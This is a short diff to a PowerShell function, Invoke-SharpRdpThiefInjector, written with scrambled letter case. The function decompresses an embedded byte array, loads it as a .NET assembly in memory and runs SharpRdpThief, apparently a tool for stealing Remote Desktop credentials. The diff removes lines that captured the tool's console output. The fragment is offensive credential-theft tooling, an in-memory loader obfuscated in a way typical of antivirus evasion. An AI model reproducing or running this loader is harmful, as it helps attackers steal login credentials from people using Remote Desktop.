@@ -6,14 +6,6 @@ function Invoke-SharpRdpThiefInjector
     $dEcoMPReSSEd.copYto( $outPUt )
     [BYte[]]$ByTEOuTarrAy = $OUtPUT.toarrAY()
     $RAs = [sySTeM.REfLecTIOn.ASSEmBlY]::load($bYTeOUTArraY)
-    $olDconsOLeOuT = [CONSoLe]::out
-    $StRInGwritEr = nEW-ObJEct System.IO.STRiNgwRiTEr
-    [cONSOLE]::sEtOut($STringWRITer)
-
     [SharpRdpThief.Program]::maiN(" ".Split())
-
-    [cOnsolE]::sEtout($olDCONsOleout)
-    $resUlTs = $sTRInGWRiter.TOSTring()
-    $rESuLTs
 }
 Invoke-SharpRdpThiefInjector
